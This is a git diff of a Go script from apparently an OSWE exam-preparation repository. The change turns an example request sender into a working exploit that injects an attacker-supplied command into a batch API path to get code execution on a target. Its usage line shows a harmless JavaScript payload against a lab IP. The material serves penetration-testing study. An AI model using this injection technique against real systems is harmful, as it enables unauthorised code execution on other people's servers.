@@ -13,13 +13,13 @@ import (
 	"github.com/iPhantasmic/OSWE/scripts/utils"
 )
 
-// Chp 6.3 - Vulnerability Discovery
+// Chp 6.4 - Triggering the Vulnerability
 
 var client *http.Client
 
 const proxyURL = "http://127.0.0.1:8080"
 
-func sendExample(debug bool, ip string) {
+func sendCommand(debug bool, ip, cmd string) {
 	// do necessary URL manipulation
 	requestURL := fmt.Sprintf("http://%s:8080/batch", ip)
 
@@ -27,7 +27,7 @@ func sendExample(debug bool, ip string) {
 		"requests": []map[string]interface{}{
 			{"method": "get", "path": "/profile"},
 			{"method": "get", "path": "/item"},
-			{"method": "get", "path": "/item/$1.id"},
+			{"method": "get", "path": fmt.Sprintf("/item/$1.id;%s", cmd)},
 		},
 	}
 
@@ -61,12 +61,13 @@ func main() {
 	log.Println("Args: ", args)
 
 	if len(args) < 2 {
-		utils.PrintFailure(fmt.Sprintf("usage: %s [-debug=true] [-proxy=true] <target>", os.Args[0]))
-		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103", os.Args[0]))
+		utils.PrintFailure(fmt.Sprintf("usage: %s [-debug=true] [-proxy=true] <target> <command>", os.Args[0]))
+		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103 \"require('util').log('CODE_EXECUTION');\"", os.Args[0]))
 		os.Exit(1)
 	}
 
 	ip := flag.Arg(0)
+	cmd := flag.Arg(1)
 
 	if *useProxy {
 		// disable TLS verification and set proxy URL
@@ -88,6 +89,6 @@ func main() {
 		Transport: tr,
 	}
 
-	sendExample(*debug, ip)
+	sendCommand(*debug, ip, cmd)
 	utils.PrintSuccess("Done!")
 }
